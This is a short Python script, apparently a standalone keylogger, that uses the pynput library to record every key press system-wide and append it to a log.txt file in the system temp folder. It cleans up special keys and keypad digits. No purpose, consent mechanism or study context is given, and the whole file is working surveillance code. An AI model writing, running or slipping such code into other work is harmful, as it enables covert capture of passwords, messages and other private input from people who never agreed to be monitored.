import os
from pynput.keyboard import Key, Listener

# Get the system temp folder dynamically
temp_path = os.path.join(os.environ["TEMP"])
log_file = os.path.join(temp_path, "log.txt")

def write_to_file(key):
    key = str(key).replace("'", "")  
    with open(log_file, "a") as f:
        if key == 'Key.space':
            f.write(" ")
        elif key == 'Key.enter':
            f.write("[ENTER]")
        elif key == 'Key.backspace':
            f.write("[BACKSPACE]")
        elif key == 'Key.tab':
            f.write("\t")
        elif key == 'Key.ctrl_l':
            f.write("")
        elif key == 'Key.shift':
            f.write("")
        elif key == 'Key.shift_r':
            f.write("")
        elif key == 'Key.ctrl_r':
            f.write("")
        elif key == 'Key.left':
            f.write("")
        elif key == 'Key.up':
            f.write("")
        elif key == 'Key.down':
            f.write("")
        elif key == 'Key.right':
            f.write("")
        elif key == 'Key.ctrl':
            f.write("")


        elif key == '<96>':
            f.write("0")
        elif key == '<97>':
            f.write("1")
        elif key == '<98>':
            f.write("2")
        elif key == '<99>':
            f.write("3")
        elif key == '<100>':
            f.write("4")
        elif key == '<101>':
            f.write("5")
        elif key == '<102>':
            f.write("6")
        elif key == '<103>':
            f.write("7")
        elif key == '<104>':
            f.write("8")
        elif key == '<105>':
            f.write("9")

        else:
            f.write(key)

def on_press(key):
    write_to_file(key)

with Listener(on_press=on_press) as listener:
    listener.join()
